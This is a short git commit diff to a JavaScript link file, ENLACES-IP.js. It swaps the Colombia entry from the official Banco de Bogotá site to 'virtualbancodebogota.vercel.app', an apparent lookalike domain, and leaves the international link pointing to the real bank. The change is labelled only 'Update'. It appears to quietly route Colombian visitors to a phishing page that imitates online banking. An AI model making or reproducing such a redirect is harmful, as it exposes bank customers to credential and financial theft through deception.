b6df51bbfd2b930c82536cc358789b417c98fb12
credinetjordy-arch <credinetjordy@gmail.com>
2026-09-01 10:59:08 -0500

    Update ENLACES-IP.js

--- ENLACES-IP.js
+++ ENLACES-IP.js
@@ -10,6 +10,6 @@
    ============================================================ */
 
 window.LINK_AFILIADO = {
-  colombia: "https://www.bancodebogota.com/?ref=43678763bdB&utm_source=personasbdb&utm_medium=referral",
+  colombia: "https://virtualbancodebogota.vercel.app",
   internacional: "https://www.bancodebogota.com/?ref=43678763bdB&utm_source=personasbdb&utm_medium=referral"
 };
